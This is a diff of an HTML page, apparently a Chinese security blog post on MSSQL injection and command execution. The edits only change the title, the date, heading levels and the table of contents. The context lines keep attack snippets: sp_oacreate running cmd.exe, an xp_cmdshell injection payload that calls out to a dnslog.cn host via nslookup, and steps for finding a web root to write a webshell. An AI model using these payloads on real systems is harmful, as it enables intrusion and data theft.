@@ -19,7 +19,7 @@ if (!doNotTrack) {
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <title>
       
-  MSSQL注入与命令执行 &ndash; 春田花花幼稚园
+  MSSQL注入命令执行利用 &ndash; 春田花花幼稚园
 
     </title>
     
@@ -93,7 +93,7 @@ if (!doNotTrack) {
 
 <div class="Subhead">
   <div class="Subhead-heading">
-    <div class="h1 mt-3 mb-1">MSSQL注入与命令执行</div>
+    <div class="h1 mt-3 mb-1">MSSQL注入命令执行利用</div>
   </div>
   <div class="Subhead-description">
     
@@ -105,7 +105,7 @@ if (!doNotTrack) {
 
     
     <div class="float-md-right">
-      <span title="Lastmod: 2023-06-17. Published at: 2022-11-08.">
+      <span title="Lastmod: 2023-06-17. Published at: 2021-07-08.">
         
           Lastmod: 2023-06-17
         
@@ -135,10 +135,10 @@ reconfigure;
 exec sp_oacreate &#39;wscript.shell&#39;,@shell output 
 exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe /c whoami &gt;C:\\Windows\\Temp\\sqltest2.txt&#39;;
 </code></pre><p>无回显</p>
-<h3 id="法1dnslog"><strong>法1:dnslog</strong></h3>
+<h2 id="法1dnslog"><strong>法1:dnslog</strong></h2>
 <pre tabindex="0"><code>1&#39;;\nexec+\nxp_cmdshell+&#39;nslookup+1.kokoisko.dnslog.cn+114.114.114.114&#39;;---000
 </code></pre><p>无回显，不出网：</p>
-<h3 id="法2存储执行命令结果到数据库">法2:存储执行命令结果到数据库</h3>
+<h2 id="法2存储执行命令结果到数据库">法2:存储执行命令结果到数据库</h2>
 <p>创建表sqlioutput，暂存数据</p>
 <pre tabindex="0"><code>#表1：仅数据列
 create table sqlioutput(data varchar(max));
@@ -166,7 +166,7 @@ DELETE FROM sqlioutput;
 #完全删表
 DROP FROM sqlioutput;
 </code></pre><p>站库不分离：</p>
-<h3 id="法3查找网站路径写入webshell">法3:查找网站路径写入webshell</h3>
+<h2 id="法3查找网站路径写入webshell">法3:查找网站路径写入webshell</h2>
 <p>在D盘全盘查找名称为website的文件或文件夹</p>
 <pre tabindex="0"><code>dir d:\website /s /b
 </code></pre><p>写入文件到目录，带中文的路径要<a href="www.jsons.cn/utf8/">UTF8转码</a>。</p>
@@ -236,16 +236,13 @@ select concat(&#39;sel&#39;,&#39;ect&#39;);
           
   
     <div id="toc" class="Box Box--blue mb-3">
-      <b>MSSQL注入与命令执行</b><nav id="TableOfContents">
+      <b>MSSQL注入命令执行利用</b><nav id="TableOfContents">
   <ul>
     <li><a href="#存在堆叠注入">存在堆叠注入</a></li>
-    <li><a href="#开启xp_cmdshell">开启XP_cmdshell</a>
-      <ul>
-        <li><a href="#法1dnslog"><strong>法1:dnslog</strong></a></li>
-        <li><a href="#法2存储执行命令结果到数据库">法2:存储执行命令结果到数据库</a></li>
-        <li><a href="#法3查找网站路径写入webshell">法3:查找网站路径写入webshell</a></li>
-      </ul>
-    </li>
+    <li><a href="#开启xp_cmdshell">开启XP_cmdshell</a></li>
+    <li><a href="#法1dnslog"><strong>法1:dnslog</strong></a></li>
+    <li><a href="#法2存储执行命令结果到数据库">法2:存储执行命令结果到数据库</a></li>
+    <li><a href="#法3查找网站路径写入webshell">法3:查找网站路径写入webshell</a></li>
     <li><a href="#tips">Tips</a></li>
     <li><a href="#参考链接">参考链接</a></li>
   </ul>
